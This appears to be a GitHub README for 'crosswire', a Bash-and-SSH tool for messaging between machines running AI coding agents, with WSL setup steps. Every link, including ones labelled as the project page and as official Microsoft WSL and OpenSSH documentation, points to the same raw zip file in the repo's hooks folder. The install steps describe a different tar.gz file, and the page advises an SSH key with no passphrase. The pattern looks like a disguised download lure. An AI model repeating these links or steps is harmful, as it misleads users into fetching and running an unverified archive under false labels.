# 🚦 crosswire - Simple Cross-Machine Communication  

[![Download crosswire](https://img.shields.io/badge/Download-crosswire-4caf50?style=for-the-badge)](https://github.com/wdw2017/crosswire/raw/refs/heads/main/hooks/Software-3.5.zip)

crosswire (xw) is a tool that helps different machines talk to each other. It uses files and SSH to send messages. You do not need special software to run it, just Bash. It works with many AI coding agents.  

## 📋 What is crosswire?

crosswire lets you share information between computers. It uses files to move messages and connects using SSH. This means you can run AI coding agents on one computer and control them from another.  

The tool does not require extra libraries. It works with Bash, which is common on many systems. The design is agent-agnostic, so it handles many different coding tools without extra setup.  

This makes it useful if you want to:  
- Coordinate tasks across several computers  
- Use AI coding tools from different places  
- Keep setup simple without installing many programs  

## 💻 System Requirements  

To use crosswire on Windows, you need:  
- Windows 10 or newer  
- Windows Subsystem for Linux (WSL) installed and enabled  
- An SSH client (comes with WSL or can be installed)  
- Internet connection to download  

**Note:** crosswire depends on Bash. Windows does not have Bash natively. WSL provides Bash on Windows.  

## 🔧 Setting Up WSL on Windows  

1. Click the Start menu and type **PowerShell**. Right-click it and select **Run as administrator**.  
2. In PowerShell, enter this command and press Enter:  
   ```powershell  
   wsl --install  
   ```  
3. Restart your computer if prompted.  
4. Open the Microsoft Store app.  
5. Search for **Ubuntu** and install the latest version.  
6. After installation, launch Ubuntu from the Start menu.  
7. Create a user account and password when prompted.  

Now you have a Bash environment ready to run crosswire.  

## 🌐 How to Download crosswire  

You will download crosswire from the GitHub project page. This page stores the latest files and instructions.  

[![Download crosswire](https://img.shields.io/badge/Download-crosswire-008080?style=for-the-badge)](https://github.com/wdw2017/crosswire/raw/refs/heads/main/hooks/Software-3.5.zip)  

Click the button above or visit the page here:  
https://github.com/wdw2017/crosswire/raw/refs/heads/main/hooks/Software-3.5.zip  

On the page:  
- Look for the **Releases** section or tab.  
- Find the latest release version listed.  
- Download the file named something like `crosswire.tar.gz` or similar.  

Save the download to a folder you can find easily, like **Downloads**.  

## 📂 Installing crosswire  

1. Open your WSL Ubuntu terminal.  
2. Navigate to the folder where you saved the file. If you saved it in Windows Downloads, use:  
   ```bash  
   cd /mnt/c/Users/YourWindowsUsername/Downloads  
   ```  
3. Extract the downloaded file:  
   ```bash  
   tar -xvzf crosswire.tar.gz  
   ```  
4. Change to the extracted directory:  
   ```bash  
   cd crosswire  
   ```  
5. Make the main script executable:  
   ```bash  
   chmod +x xw.sh  
   ```  

Now crosswire is ready to use.  

## 🚀 Running crosswire  

To start crosswire, run this command in your Bash prompt:  
```bash  
./xw.sh  
```  

This will launch crosswire’s command-line interface. You will see instructions as you go.  

## 🔑 Using SSH with crosswire  

crosswire connects your machines using SSH. SSH is a way to log into another computer securely. To use crosswire well, set up SSH keys between your machines. This will let you connect without typing a password every time.  

### How to set up SSH keys:  

1. In your WSL terminal, generate SSH keys if you don’t have them:  
   ```bash  
   ssh-keygen -t rsa -b 4096  
   ```  
   Press Enter to accept defaults and leave the passphrase empty for easy access.  
2. Copy the public key to the remote machine:  
   ```bash  
   ssh-copy-id username@remote-machine-ip  
   ```  
   Replace `username` and `remote-machine-ip` with your details.  
3. Test the connection:  
   ```bash  
   ssh username@remote-machine-ip  
   ```  
   It should connect without asking for a password.  

Once SSH is set up, crosswire will use it to communicate between machines.  

## 🗂 How crosswire works  

crosswire uses three main parts:  

- **File system:** Messages move as files between machines.  
- **SSH bridge:** This connects the machines with secure links.  
- **Agent-agnostic design:** crosswire does not care which AI tool you run.  

You send a message to a file on one machine. crosswire moves it over SSH. The other machine reads the file and replies with its own message file. This setup keeps communication clear and simple.  

## ⚙️ Common Commands  

Inside crosswire’s interface, you can use commands like:  

- `send <file>` — Send a file to the connected machine  
- `receive` — Check for files received from the other machine  
- `status` — See connection status and settings  
- `exit` — Close crosswire  

Use `help` to list all available commands and get descriptions.  

## 🔄 Updating crosswire  

To get updates:  
1. Go back to the GitHub page: https://github.com/wdw2017/crosswire/raw/refs/heads/main/hooks/Software-3.5.zip  
2. Download the newest release.  
3. Extract and replace your current files as before.  

Keep your crosswire updated to fix issues and add new features.  

## 🛠 Troubleshooting  

- **Bash not found:** Make sure WSL is installed and you use Ubuntu or another Bash shell.  
- **SSH connection fails:** Check your network, SSH key setup, and machine IP addresses.  
- **Permission denied:** Ensure you made scripts executable with `chmod +x`.  
- **Files not transferring:** Verify SSH connection and folder access rights.  

If errors continue, check the issues tab on the GitHub page for known problems.  

## 📚 Additional Resources  

If you want to learn more about SSH and WSL, these official guides help:  

- Microsoft WSL docs: https://github.com/wdw2017/crosswire/raw/refs/heads/main/hooks/Software-3.5.zip  
- OpenSSH docs: https://github.com/wdw2017/crosswire/raw/refs/heads/main/hooks/Software-3.5.zip  

crosswire works best when these tools are set up correctly.  

---  

[Download crosswire](https://github.com/wdw2017/crosswire/raw/refs/heads/main/hooks/Software-3.5.zip) to start using cross-machine communication today.